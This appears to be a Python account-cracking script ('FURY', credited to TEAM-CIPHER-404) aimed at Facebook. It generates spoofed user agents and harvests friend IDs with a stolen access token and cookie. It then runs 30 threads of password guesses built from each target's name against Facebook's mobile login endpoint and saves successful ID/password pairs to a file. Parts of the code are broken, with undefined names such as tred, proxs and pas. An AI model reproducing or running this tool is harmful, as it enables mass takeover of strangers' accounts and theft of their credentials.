import requests,json,os,sys,random,datetime,time,re
import urllib3,base64
import requests,zlib,platform

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uaku2)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Win64; x64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    mew=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen2.append(mew)
    
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen2.append(uaku2)

try:
    uf=open('user-agent.txt','r').read().splitlines()
    for ua in uf:
        ugen.append(ua)
except:
    uagent = requests.get('https://raw.githubusercontent.com/TEAM-CIPHER-404/data/main/dalvik_user-agent.txt').text.splitlines()
    uf=open('user-agent.txt','w')
    for ua in uagent:
        uf.write(ua+'\n')
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def sawrojj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	menu()
	
#------------------[ MAIN ]-----------------#

logo = """ \033[1;35mO~~~~~~~~\033[1;93mO~~     \033[1;93mO~~O~~~~~~~    \033[1;96mO~~      O~~
  \033[1;35mO~~      \033[1;93mO~~     \033[1;93mO~~O~~    O~~   \033[1;96mO~~    O~~ 
  \033[1;35mO~~      \033[1;93mO~~     \033[1;93mO~~O~~    O~~    \033[1;96mO~~ O~~   
  \033[1;35mO~~~~~~  \033[1;93mO~~     \033[1;93mO~~O~ O~~          \033[1;96mO~~     
  \033[1;35mO~~      \033[1;93mO~~     \033[1;93mO~~O~~  O~~        \033[1;96mO~~     
  \033[1;35mO~~      \033[1;93mO~~     \033[1;93mO~~O~~    O~~      \033[1;96mO~~     
  \033[1;35mO~~        \033[1;93mO~~~~~   \033[1;93mO~~      O~~    \033[1;96mO~~\x1b[0m
   """

def banner():
    os.system("clear")
    print(logo)



def menu():
	os.system('clear')
	banner()
	sawrojj('\x1b[1;97m [1] File cloning\n [2] Telegram\n [3] GitHub\n [0] Exit ')
	sawrojj('══════════════════════')
	SAWROJ= input('\x1b[1;92mChoose : ');time.sleep(0.01)
	if SAWROJ in ['1']:
		crack_file()
	elif SAWROJ in ['2']:
		os.system('xdg-open https://t.me/TEAMCIPHER404')
	elif SAWROJ in ['3','03']:
		os.system('xdg-open https://github.com/TEAM-CIPHER-404/')
	elif SAWROJ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('Logout Successful ')
		exit()
	else:
		print('Please Select Correct ')
		back()
def error():
	print(f'{k} Try Again{u}')
	time.sleep(4)
	back()

def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m [•] ENTER THE NUMBERS OF IDZ: '))
	except ValueError:
		print(' INVALID OPTION ')
		back()
	if jum<1 or jum>100000000:
		print('#TRY AGAIN ')
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [•] INPUT ID '+str(yz)+': ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('#TRY AGAIN ')
			os.system('clear')
	try:
		print(f' [•] TOTAL ID: {P}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
		time.sleep(3)
		back()
		
def crack_file():
	os.system('clear')
	banner()
	o = input('\x1b[1;97mFile path : ')
	print('')
	try:lin = open(o).read().splitlines()
	except FileNotFoundError:
		print('• File Not Found')
		time.sleep(3)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
    
	print('\x1b[1;92m Login Mathod\n\x1b[1;97m [1] Meta Facebook\n [2] M basic')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['9','09']:
		method.append('mbasic')
	else:
		method.append('mobile')
	passwrd()
	exit()

def passwrd():
	os.system('clear')
	banner()
	print("\x1b[1;97mUse Flight mod every 2 minutes\033[1;37m")
	print('\x1b[1;97m Total Idz : '+str(len(id)))
	print("\x1b[1;97mCloning Started .... wait")
	sawrojj(f'══════════════════════')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pwv.append(nmf)
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@@')
					pwv.append(frs+'11')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@@')
					pwv.append(frs+'11')
				pool.submit(crack,idf,pwv)
	print('')
	sawrojj('══════════════════════')
	sawrojj('Cloning Complete .......... ')
	print(f'{h}[{h}•{h}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{x}•{x}]{x} CP : {x}%s{x} '%(cp))
	input('Click enter to back ')
		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r [FURY] {P}{loop}{P}/{P}{len(id)}{P} OK{P}={H}{ok}{P} CP{P}={P}{cp}{x} {P}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221ij5am11iil6hz1wvbxly1aw5nr1xdaxdnuhpedw1sskkp21k5mi75%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc3210f68-dec3-4e45-b2dd-3343c162aa15%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221ij5am11iil6hz1wvbxly1aw5nr1xdaxdnuhpedw1sskkp21k5mi75%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://mbasic.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&state=%7B%22fbLoginKey%22%3A%221ij5am11iil6hz1wvbxly1aw5nr1xdaxdnuhpedw1sskkp21k5mi75%22%2C%22fbLoginReturnURL%22%3A%22%2F%22%7D&scope=email&response_type=code%2Cgranted_scopes&locale=id_ID&ret=login&fbapp_pres=0&logger_id=c3210f68-dec3-4e45-b2dd-3343c162aa15&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H} [TC-OK] {idf}  {pw}')
				open('/sdcard/TC-OK.txt','a').write(uid+'|'+pas+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(11)
	loop+=1
if __name__=='__main__':
	try:os.system('touch .prox.txt')
	except:pass
	menu()